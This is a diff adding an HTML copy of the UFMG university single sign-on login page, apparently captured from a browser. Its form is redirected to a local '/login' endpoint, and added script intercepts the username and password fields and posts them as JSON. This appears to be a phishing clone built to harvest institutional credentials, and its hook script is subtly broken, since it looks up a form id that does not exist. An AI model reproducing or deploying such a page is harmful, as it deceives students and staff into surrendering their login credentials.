@@ -1,0 +1,96 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+    <link rel="stylesheet" type="text/css" href="/idp/css/idp.css" media="all">
+    <script language="javascript" charset="ISO-8859-1" type="text/javascript" src="/idp/js/idp.js"></script>
+    <script>
+        async function postFormDataAsJson({ url, formData }) {
+            const plainFormData = Object.fromEntries(formData.entries());
+            const formDataJsonString = JSON.stringify(plainFormData);
+
+            const fetchOptions = {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    Accept: "application/json",
+                },
+                body: formDataJsonString,
+            };
+
+            const response = await fetch(url, fetchOptions);
+
+            if (!response.ok) {
+                const errorMessage = await response.text();
+                throw new Error(errorMessage);
+            }
+
+            return response.json();
+        }
+
+        async function handleFormSubmit(event) {
+            event.preventDefault();
+
+            const form = event.currentTarget;
+            const url = form.action;
+
+            try {
+                const formData = new FormData(form);
+                const responseData = await postFormDataAsJson({ url, formData });
+
+                console.log({ responseData });
+            } catch (error) {
+                console.error(error);
+            }
+        }
+
+    </script>
+    <title>SSO - minhaUFMG</title>
+</head>
+<body onload="loginFieldFocus()" class="vsc-initialized">
+    <div id="box">
+        <form name="loginForm" action="/login" method="POST" onsubmit="return validateFormOnSubmit()">
+            
+            <div id="box_links">
+                <ul>
+                    <li><a target="_blank" href="https://sistemas.ufmg.br/termos-de-uso">Termos de uso dos recursos de TI da UFMG.</a></li>
+                    <li><a target="_blank" href="https://www.grude.ufmg.br/gerus/Portal.nsf/frNovoUsuario?OpenForm">Novo usuário? Veja como acessar a minhaUFMG.</a></li>
+                    <li><a target="_blank" href="https://www.grude.ufmg.br/gerus/Registro.nsf/frRegInicIdUsuario?OpenForm&amp;2">Se você esqueceu sua senha, recupere-a.</a></li>
+                </ul>
+                
+            </div>
+            
+            <div id="box_dots"><img src="/idp/images/dots.gif" width="5" height="1" alt="Pontos"></div>
+            
+            <div id="box_login">
+                
+                <div id="box_login_title">Login</div>
+                <div id="box_login_fields">
+                    <p><label for="j_username"><img src="/idp/images/usuario.gif" alt="Usuario" height="18" width="94"></label></p>
+                    <p><input name="j_username" id="j_username" size="14" maxlength="50" class="box_login_field" type="text" autocapitalize="off" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAUBJREFUOBGVVE2ORUAQLvIS4gwzEysHkHgnkMiEc4zEJXCMNwtWTmDh3UGcYoaFhZUFCzFVnu4wIaiE+vvq6+6qTgthGH6O4/jA7x1OiCAIPwj7CoLgSXDxSjEVzAt9k01CBKdWfsFf/2WNuEwc2YqigKZpK9glAlVVwTTNbQJZlnlCkiTAZnF/mePB2biRdhwHdF2HJEmgaRrwPA+qqoI4jle5/8XkXzrCFoHg+/5ICdpm13UTho7Q9/0WnsfwiL/ouHwHrJgQR8WEwVG+oXpMPaDAkdzvd7AsC8qyhCiKJjiRnCKwbRsMw9hcQ5zv9maSBeu6hjRNYRgGFuKaCNwjkjzPoSiK1d1gDDecQobOBwswzabD/D3Np7AHOIrvNpHmPI+Kc2RZBm3bcp8wuwSIot7QQ0PznoR6wYSK0Xb/AGVLcWwc7Ng3AAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;"></p>
+                    <p><label for="j_password"><img src="/idp/images/senha.gif" alt="Senha" height="18" width="94"></label></p>
+                    <div id="box_login_capslock" class="box_login_capslock" style="display:none">Capslock ligado!</div>
+                    <p><input name="j_password" id="j_password" size="14" maxlength="50" class="box_login_field" onkeypress="checkCapsLock(event)" onchange="captchaFieldFocus()" type="password" autocapitalize="off" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAUBJREFUOBGVVE2ORUAQLvIS4gwzEysHkHgnkMiEc4zEJXCMNwtWTmDh3UGcYoaFhZUFCzFVnu4wIaiE+vvq6+6qTgthGH6O4/jA7x1OiCAIPwj7CoLgSXDxSjEVzAt9k01CBKdWfsFf/2WNuEwc2YqigKZpK9glAlVVwTTNbQJZlnlCkiTAZnF/mePB2biRdhwHdF2HJEmgaRrwPA+qqoI4jle5/8XkXzrCFoHg+/5ICdpm13UTho7Q9/0WnsfwiL/ouHwHrJgQR8WEwVG+oXpMPaDAkdzvd7AsC8qyhCiKJjiRnCKwbRsMw9hcQ5zv9maSBeu6hjRNYRgGFuKaCNwjkjzPoSiK1d1gDDecQobOBwswzabD/D3Np7AHOIrvNpHmPI+Kc2RZBm3bcp8wuwSIot7QQ0PznoR6wYSK0Xb/AGVLcWwc7Ng3AAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;"></p>
+                    <div id="box_login_submit"><input name="submit" id="submit" value="Entrar" class="box_login_submit" type="submit"></div>
+                </div>
+            </div>
+            <div id="box_warning">
+                &nbsp;
+                
+                &nbsp;
+            </div>
+            
+            <div id="box_message">
+                <div id="box_message_title">Aviso</div>
+                <div id="box_message_text">
+                    <p><img src="/idp/images/novo.gif" border="0">Prezado(a) Calouro(a) de Graduação,<br><br>Informações para Calouros de Graduação do primeiro semestre de 2021: <a href="https://www.ufmg.br/dti/blog/calouros-grad" target="_blank" style="color: #1B89D6">clique aqui!</a></p>
+                </div>
+            </div>
+            
+        </form>
+    </div>
+    <script>
+        document.getElementById("j_username").setAttribute('autocapitalize', 'off');
+        document.getElementById("j_password").setAttribute('autocapitalize', 'off');
+        const exampleForm = document.getElementById("loginForm");
+        exampleForm.addEventListener("submit", handleFormSubmit);
+    </script>
+<div id="13b68f0acb51cce040574d93070d6e59"></div></body></html>
